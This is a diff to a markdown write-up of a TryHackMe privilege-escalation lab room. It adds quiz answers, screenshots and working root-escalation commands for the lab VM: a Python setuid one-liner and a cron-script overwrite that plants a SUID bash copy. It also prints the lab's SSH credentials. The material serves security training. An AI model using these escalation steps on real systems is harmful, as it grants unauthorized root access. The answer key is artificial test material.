@@ -1,5 +1,5 @@
 <h1 align="center">Linux PrivEsc Arena</h1>
-<p align="center">Jun 7 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
+<p align="center">Jun 8 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
 part of my 397-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
 Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123 <a href="https://tryhackme.com/room/linuxprivescarena"</a>here.<br><br>
 <img width="1000px" src="https://github.com/user-attachments/assets/94b9a480-2895-4126-92c1-b114a5de092c"></p>
@@ -622,14 +622,16 @@ bash-4.1#
 <h3 align="left">Answer the questions below</h3>
 
 > 12.1. <em>What CVE is being exploited in this task?</em><br><a id='12.1'></a>
->> <strong><code>___________</code></strong><br>
+>> <strong><code>CVE-2016-1247</code></strong><br>
+
+![image](https://github.com/user-attachments/assets/6768761c-0772-498f-8ce2-3a6e5d2593bf)
+
+![image](https://github.com/user-attachments/assets/48a5cbe0-a477-4af1-bfe2-90c0ee505566)
 
 > 12.2. <em>What binary is SUID enabled and assists in the attack?</em><br><a id='12.2'></a>
->> <strong><code>___________</code></strong><br>
+>> <strong><code>sudo</code></strong><br>
 
-```bash
-
-```
+![image](https://github.com/user-attachments/assets/40d961ec-5132-4453-adff-8b02b3c21f04)
 
 <br>
 
@@ -638,11 +640,13 @@ bash-4.1#
 <h3 align="left">Answer the question below</h3>
 
 > 13.1. <em>What is the last line of the "strings /usr/local/bin/suid-env" output?</em><br><a id='13.1'></a>
->> <strong><code>___________</code></strong><br>
+>> <strong><code>service apache2 start</code></strong><br>
 
-```bash
+![image](https://github.com/user-attachments/assets/6a20b719-7dbc-425a-8138-37969805461e)
 
-```
+![image](https://github.com/user-attachments/assets/56519cff-37b1-46ac-8205-7e0047c6e265)
+
+![image](https://github.com/user-attachments/assets/f674f2d2-3b2c-43c6-b22e-4bab7a382102)
 
 <br>
 
@@ -651,11 +655,13 @@ bash-4.1#
 <h3 align="left">Answer the question below</h3>
 
 > 14.1. <em>What is the last line of the "strings /usr/local/bin/suid-env2" output?</em><br><a id='14.1'></a>
->> <strong><code>___________</code></strong><br>
+>> <strong><code>/usr/sbin/service apache2 start</code></strong><br>
 
-```bash
+![image](https://github.com/user-attachments/assets/87839f80-9192-4d67-80ea-00c8afcbe715)
 
-```
+![image](https://github.com/user-attachments/assets/857f0097-8d52-4a93-ac4b-b3a3a1431a04)
+
+![image](https://github.com/user-attachments/assets/b69f7e86-bdcf-4106-bf8f-7616bdab1fe0)
 
 <br>
 
@@ -667,7 +673,10 @@ bash-4.1#
 >> <strong><code>No answer needed</code></strong><br>
 
 ```bash
-
+TCM@debian:/home$ getcap -r / 2>/dev/null
+...
+TCM@debian:/home$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@debian:/home# 
 ```
 
 <br>
@@ -679,9 +688,9 @@ bash-4.1#
 > 16.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='16.1'></a>
 >> <strong><code>No answer needed</code></strong><br>
 
-```bash
+![image](https://github.com/user-attachments/assets/7c670c15-9afa-425c-bd0a-70848e0bd179)
 
-```
+![image](https://github.com/user-attachments/assets/f88d00e1-0f32-4fa5-8765-4ea8bfdcc64e)
 
 <br>
 
@@ -692,18 +701,42 @@ bash-4.1#
 > 17.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='17.1'></a>
 >> <strong><code>No answer needed</code></strong><br>
 
-```bash
+![image](https://github.com/user-attachments/assets/b182cb72-7e9e-48fe-8a2e-cfbd0e7b03bd)
 
-```
+![image](https://github.com/user-attachments/assets/1c66c1f0-1945-45e8-8c51-b13d540b9ce7)
+
+![image](https://github.com/user-attachments/assets/290b1bcd-646c-480f-a09b-ed0cab9e376e)
 
 <br>
 
 <h2>Task 18 . Privilege Escalation - Cron (File Overwrite)</h2>
 
+<h3>Detection</h3>
+
+<p>Linux VM<br>
+
+1. In command prompt type: <code>cat /etc/crontab</code><br>
+2. From the output, notice the script “overwrite.sh”<br>
+3. In command prompt type: <code>ls -l /usr/local/bin/overwrite.sh</code><br>
+4. From the output, notice the file permissions.</p>
+
+<h3>Exploitation</h3>
+
+<p>Linux VM<br>
+
+1. In command prompt type: <code>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh</code><br>
+2. Wait 1 minute for the Bash script to execute.<br>
+3. In command prompt type: <code>/tmp/bash -p</code><br>
+4. In command prompt type: <code>id</code></p>
+
 <h3 align="left">Answer the question below</h3>
 
 > 18.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='18.1'></a>
 >> <strong><code>No answer needed</code></strong><br>
+
+![image](https://github.com/user-attachments/assets/aee61937-f332-4172-bbff-e7f70db7fbd6)
+
+![image](https://github.com/user-attachments/assets/4bd5020f-cdf5-456f-9705-6270cf1bbf7a)
 
 ```bash
 
